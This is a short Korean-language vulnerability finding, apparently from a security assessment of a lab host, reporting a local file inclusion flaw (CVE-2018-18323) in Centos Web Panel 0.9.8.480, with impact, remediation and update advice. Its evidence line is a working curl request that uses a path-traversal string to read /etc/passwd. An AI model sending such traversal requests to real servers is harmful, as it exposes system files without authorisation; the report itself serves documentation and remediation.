## Centos Web Panel 0.9.8.480 - Local File Inclusion
- **End-Point**: `http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php/admin/index.php`, `http://192.168.64.2:9991/www/FileInclusion/pages/lvl1.php/admin/index.php`
- **영향**: 공격자가 서버의 민감한 파일을 읽을 수 있으며, 이는 추가적인 시스템 침해로 이어질 수 있음.
- **설명**: Centos Web Panel 0.9.8.480 버전에서 발생하는 로컬 파일 포함(LFI) 취약점(CVE-2018-18323)으로, 해당 버전은 XSS 및 RCE 취약점의 영향도 받을 수 있음.
- **근거**: `curl`을 통해 `file` 파라미터에 경로 탐색 문자열을 삽입하여 `/etc/passwd` 파일 접근을 시도함: `curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36' 'http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php/admin/index.php?module=file_editor&file=/../../../../../../../../../../../etc/passwd'`
- **대응**: 사용자 입력값에 대한 경로 탐색 문자(`../`) 필터링 및 화이트리스트 기반의 파일 접근 제어 로직을 구현함.
- **조치**: 취약점이 해결된 최신 버전의 Centos Web Panel로 업데이트를 수행함.
